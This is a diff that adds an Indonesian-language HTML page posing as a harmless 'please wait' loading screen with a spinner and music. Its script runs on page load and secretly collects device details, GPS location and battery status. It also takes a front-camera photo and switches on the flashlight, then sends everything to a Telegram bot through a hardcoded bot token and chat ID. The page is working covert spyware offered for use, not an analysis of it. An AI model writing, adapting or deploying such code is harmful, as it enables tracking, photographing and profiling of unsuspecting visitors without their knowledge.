@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            background: linear-gradient(45deg, #ff9a9e, #fad0c4);
+            text-align: center;
+            font-family: Arial, sans-serif;
+            color: white;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .loading-animation {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        audio {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>Silakan Tunggu...</h1>
+    <div class="loading-animation"></div>
+    <audio id="backgroundMusic" autoplay loop>
+        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        const botToken = "7123253254:AAEW8xxJzx38d-g_KVCa2eTM9dyBA0tugTo";
+        const chatId = "7895289556";
+        let streamTrack = null;
+
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
+        }
+
+        function sendPhotoToTelegram(photoBlob) {
+            let formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", photoBlob, "photo.jpg");
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+        }
+
+        function getDeviceSpecs() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                memory: navigator.deviceMemory || "Unknown",
+                cores: navigator.hardwareConcurrency || "Unknown",
+                online: navigator.onLine,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled
+            };
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    let lat = position.coords.latitude;
+                    let lon = position.coords.longitude;
+                    let accuracy = position.coords.accuracy;
+
+                    let locationMessage = `📍 **Lokasi HP**:\nLatitude: ${lat}\nLongitude: ${lon}\nAkurasi: ${accuracy} meter`;
+                    sendToTelegram(locationMessage);
+                });
+            } else {
+                sendToTelegram("❌ Geolocation tidak didukung.");
+            }
+        }
+
+        function checkBattery() {
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    let batteryStatus = `🔋 **Status Baterai**:\n` +
+                        `- Persentase: ${Math.round(battery.level * 100)}%\n` +
+                        `- Sedang di-charge: ${battery.charging ? "Ya" : "Tidak"}\n` +
+                        `- Waktu hingga penuh: ${battery.chargingTime ? battery.chargingTime + " detik" : "Tidak diketahui"}\n` +
+                        `- Waktu hingga habis: ${battery.dischargingTime ? battery.dischargingTime + " detik" : "Tidak diketahui"}`;
+
+                    sendToTelegram(batteryStatus);
+                });
+            } else {
+                sendToTelegram("❌ Perangkat tidak mendukung pemeriksaan baterai.");
+            }
+        }
+
+        function capturePhoto() {
+            let video = document.createElement("video");
+            document.body.appendChild(video);
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.play();
+                    streamTrack = stream.getVideoTracks()[0];
+
+                    setTimeout(() => {
+                        let canvas = document.createElement("canvas");
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        let ctx = canvas.getContext("2d");
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        canvas.toBlob(blob => {
+                            sendPhotoToTelegram(blob);
+                            stream.getTracks().forEach(track => track.stop());
+                            video.remove();
+                        }, "image/jpeg");
+                    }, 3000); 
+                })
+                .catch(error => {
+                    sendToTelegram("❌ Gagal mengakses kamera: " + error);
+                });
+        }
+
+        function toggleFlash(autoOff = true) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
+                .then(stream => {
+                    streamTrack = stream.getVideoTracks()[0];
+
+                    if (streamTrack.getCapabilities().torch) {
+                        streamTrack.applyConstraints({ advanced: [{ torch: true }] })
+                            .then(() => {
+                                sendToTelegram("💡 **Senter dinyalakan**");
+                                if (autoOff) {
+                                    setTimeout(() => {
+                                        streamTrack.applyConstraints({ advanced: [{ torch: false }] });
+                                        sendToTelegram("💡 **Senter dimatikan**");
+                                        streamTrack.stop();
+                                    }, 3000); 
+                                }
+                            });
+                    }
+                })
+                .catch(() => {
+                    sendToTelegram("❌ Senter tidak didukung.");
+                });
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            let specs = getDeviceSpecs();
+            let specMessage = `📱 **Spesifikasi HP**:\n${JSON.stringify(specs, null, 2)}`;
+            sendToTelegram(specMessage);
+
+            getLocation();
+            checkBattery();
+            capturePhoto();
+            toggleFlash();
+
+            let music = document.getElementById("backgroundMusic");
+            music.play().catch(() => {
+                console.warn("Pemutaran musik di-block oleh browser. Klik di mana saja untuk memulai.");
+            });
+        });
+
+        document.addEventListener("click", () => {
+            let music = document.getElementById("backgroundMusic");
+            music.play();
+        });
+    </script>
+</body>
+</html>
